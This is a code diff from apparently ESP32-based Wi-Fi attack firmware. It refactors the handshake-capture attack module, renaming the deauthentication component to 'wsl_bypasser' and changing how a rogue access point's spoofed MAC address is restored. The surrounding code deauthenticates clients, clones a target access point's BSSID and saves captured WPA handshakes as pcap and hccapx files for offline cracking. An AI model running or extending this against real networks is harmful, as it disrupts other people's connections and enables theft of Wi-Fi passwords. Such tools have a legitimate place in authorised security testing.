@@ -17,7 +17,7 @@
 #include "esp_wifi_types.h"
 
 #include "attack.h"
-#include "deauther.h"
+#include "wsl_bypasser.h"
 #include "wifi_controller.h"
 #include "frame_analyzer.h"
 #include "pcap_serializer.h"
@@ -26,7 +26,6 @@
 static const char *TAG = "main:attack_handshake";
 static esp_timer_handle_t deauth_timer_handle;
 static attack_handshake_methods_t method = -1;
-static uint8_t mac_ap_orig[6];
 static const wifi_ap_record_t *ap_record = NULL;
 
 /**
@@ -36,7 +35,7 @@ static const wifi_ap_record_t *ap_record = NULL;
  * appends the frame to status content and serialize them into pcap and hccapx format.
  * 
  * @param args not used
- * @param event_base expects DATA_FRAME_EVENTS
+ * @param event_base expects FRAME_ANALYZER_EVENTS
  * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
  * @param event_data expects wifi_promiscuous_pkt_t
  */
@@ -57,7 +56,7 @@ static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int3
  * @param arg not used
  */
 static void timer_send_deauth_frame(void* arg){
-    deauther_send_deauth_frame(ap_record);
+    wsl_bypasser_send_deauth_frame(ap_record);
 }
 
 /**
@@ -82,7 +81,6 @@ static void attack_handshake_method_broadcast(){
  */
 static void attack_handshake_method_rogueap(){
     ESP_LOGD(TAG, "Configuring Rogue AP");
-    wifictl_get_ap_mac(mac_ap_orig);
     wifictl_set_ap_mac(ap_record->bssid);
     wifi_config_t ap_config = {
         .ap = {
@@ -106,7 +104,7 @@ void attack_handshake_start(attack_config_t *attack_config){
     wifictl_sniffer_filter_frame_types(true, false, false);
     wifictl_sniffer_start(ap_record->primary);
     frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
-    ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
+    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
     switch(attack_config->method){
         case ATTACK_HANDSHAKE_METHOD_BROADCAST:
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
@@ -130,7 +128,7 @@ void attack_handshake_stop(){
             break;
         case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
             wifictl_mgmt_ap_start();
-            wifictl_set_ap_mac(mac_ap_orig);
+            wifictl_restore_ap_mac();
             break;
         default:
             ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
